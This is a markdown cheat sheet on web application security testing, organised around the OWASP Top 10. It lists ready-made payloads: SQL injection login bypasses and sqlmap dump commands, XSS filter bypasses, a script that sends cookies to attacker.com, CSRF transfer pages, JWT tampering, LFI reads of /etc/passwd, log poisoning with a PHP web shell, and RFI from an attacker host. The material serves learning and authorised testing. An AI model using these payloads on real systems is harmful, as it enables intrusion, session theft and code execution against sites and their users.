# 🌐 Web Application Security

> In-depth techniques for testing and understanding web vulnerabilities.
> Based on OWASP Top 10.

---

## Burp Suite — Essential Setup

Burp Suite is the primary tool for web security testing.

### Getting Started

1. Open Burp Suite → Proxy → Intercept ON
2. Configure your browser to use proxy: `127.0.0.1:8080`
3. Install Burp CA certificate in your browser (to intercept HTTPS)
4. Browse target — all traffic flows through Burp

### Key Tabs

| Tab | Purpose |
|-----|---------|
| Proxy | Intercept & modify requests |
| Repeater | Manually replay & tweak requests |
| Intruder | Automated fuzzing / brute force |
| Scanner | Automated vulnerability scanning (Pro) |
| Decoder | Encode/decode data (Base64, URL, etc.) |
| Comparer | Diff two requests/responses |
| Logger | Full request history |

### Useful Shortcuts

```
Ctrl+R         Send to Repeater
Ctrl+I         Send to Intruder
Ctrl+U         URL encode selected text
Right-click    Send to any tool
```

---

## SQL Injection (SQLi)

### Detection

```
'         -- single quote — look for errors
''        -- escaped quote — no error = might be vulnerable
1=1       -- always true
1=2       -- always false — different response = vulnerable
```

### Types

| Type | Description |
|------|-------------|
| In-band | Results returned directly in response |
| Blind Boolean | No output, but true/false responses differ |
| Blind Time-based | Delays response to infer data |
| Out-of-band | Data sent via DNS/HTTP to attacker server |

### Manual Exploitation

```sql
-- Login bypass
admin' --
' OR 1=1 --
' OR '1'='1

-- Union-based (find number of columns first)
' ORDER BY 1--
' ORDER BY 2--    -- keep increasing until error

-- Extract data
' UNION SELECT NULL,username,password FROM users--

-- Read files (MySQL)
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
```

### SQLmap (Automated)

```bash
sqlmap -u "http://target.com/page?id=1" --dbs           # List databases
sqlmap -u "http://target.com/page?id=1" -D mydb --tables # List tables
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump  # Dump table
sqlmap -u "http://target.com/page?id=1" --forms --batch  # Auto-detect forms
sqlmap -u "http://target.com/login" --data "user=a&pass=b" --level 5
```

---

## Cross-Site Scripting (XSS)

### Types

| Type | Stored? | Executes when? |
|------|---------|----------------|
| Reflected | No | Victim clicks crafted link |
| Stored | Yes | Anyone loads the page |
| DOM-based | No | Client-side JS processes URL |

### Basic Payloads

```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### Bypass Filters

```html
<!-- No script tags allowed? -->
<IMG SRC=x OnError=alert(1)>

<!-- Quotes filtered? -->
<img src=x onerror=alert`1`>

<!-- Angle brackets encoded? -->
javascript:alert(1)

<!-- Event handler alternatives -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
```

### Steal Cookies (Session Hijacking)

```html
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie)
</script>
```

### XSS Testing Tools

```bash
dalfox url "https://target.com/search?q=test"
xsstrike -u "https://target.com/search?q=test"
```

---

## CSRF — Cross-Site Request Forgery

### What It Is
Forces a logged-in victim's browser to make an unwanted request to a site they're authenticated on.

### Attack Example

```html
<!-- Attacker hosts this page -->
<img src="https://bank.com/transfer?to=attacker&amount=5000" style="display:none">

<!-- Or with a form -->
<form id="csrf" action="https://bank.com/transfer" method="POST" style="display:none">
  <input name="to" value="attacker">
  <input name="amount" value="5000">
</form>
<script>document.getElementById('csrf').submit()</script>
```

### Bypass CSRF Tokens

- Check if token is validated server-side
- Try removing the token parameter entirely
- Try a valid token from another session
- Check if the token is tied to the user session

---

## Authentication & Session Vulnerabilities

### Common Weaknesses

```
1. Default credentials (admin/admin, admin/password)
2. No account lockout (brute-forceable)
3. Predictable reset tokens
4. Session ID in URL
5. Session not invalidated on logout
6. Weak "remember me" cookies
```

### JWT (JSON Web Token) Attacks

```bash
# Decode without verification
echo "eyJhbGciOiJIUzI1NiJ9.payload.sig" | cut -d. -f2 | base64 -d

# Common attacks:
# 1. Change algorithm to none
# {"alg":"none","typ":"JWT"}
# Remove signature, keep trailing dot

# 2. Change role in payload
# {"user":"guest","role":"admin"}

# 3. Brute force weak secret
hashcat -m 16500 token.txt wordlist.txt
```

### Brute Force with Burp Intruder

1. Send login request to Intruder
2. Mark password field as payload position (`§password§`)
3. Load wordlist (Payloads tab)
4. Start attack, sort by response length or status

---

## File Inclusion Vulnerabilities

### Local File Inclusion (LFI)

```
https://target.com/page?file=../../../etc/passwd
https://target.com/page?file=....//....//etc/passwd
https://target.com/page?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### LFI to RCE via Log Poisoning

```bash
# 1. Inject PHP into User-Agent header
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Include the log file
https://target.com/page?file=/var/log/apache2/access.log&cmd=id
```

### Remote File Inclusion (RFI)

```
https://target.com/page?file=http://attacker.com/shell.php
```

---

## IDOR — Insecure Direct Object References

### What It Is
Accessing resources by changing an ID in a request.

```
GET /api/users/1/profile   → your profile
GET /api/users/2/profile   → another user's profile!

GET /download?file=invoice_001.pdf  → your invoice
GET /download?file=invoice_002.pdf  → someone else's!
```

### Testing

1. Find any request with an ID, number, or filename
2. Change it to adjacent values
3. Check if you can access data that isn't yours

---

## Directory Traversal & Content Discovery

### Fuzzing with ffuf

```bash
# Directory discovery
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ

# File discovery with extensions
ffuf -w common.txt -u https://target.com/FUZZ -e .php,.txt,.html,.bak

# Parameter fuzzing
ffuf -w params.txt -u https://target.com/page?FUZZ=value

# Virtual host discovery
ffuf -w subdomains.txt -H "Host: FUZZ.target.com" -u https://target.com
```

### gobuster

```bash
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dns -d target.com -w subdomains.txt
```

---

## HTTP Headers to Always Check

| Header | Look for |
|--------|----------|
| `Server` | Version info → searchable CVEs |
| `X-Powered-By` | PHP version, framework |
| `Set-Cookie` | Missing `HttpOnly`, `Secure` flags |
| `Content-Security-Policy` | Missing = XSS possible |
| `X-Frame-Options` | Missing = clickjacking possible |
| `Access-Control-Allow-Origin: *` | CORS misconfiguration |

---

## OWASP Top 10 (2021) Quick Reference

| # | Vulnerability |
|---|---------------|
| A01 | Broken Access Control |
| A02 | Cryptographic Failures |
| A03 | Injection (SQLi, XSS, etc.) |
| A04 | Insecure Design |
| A05 | Security Misconfiguration |
| A06 | Vulnerable & Outdated Components |
| A07 | Identification & Authentication Failures |
| A08 | Software & Data Integrity Failures |
| A09 | Security Logging & Monitoring Failures |
| A10 | Server-Side Request Forgery (SSRF) |

---

> 📚 Practice at: [PortSwigger Web Security Academy](https://portswigger.net/web-security) — 100% free, lab-based learning.
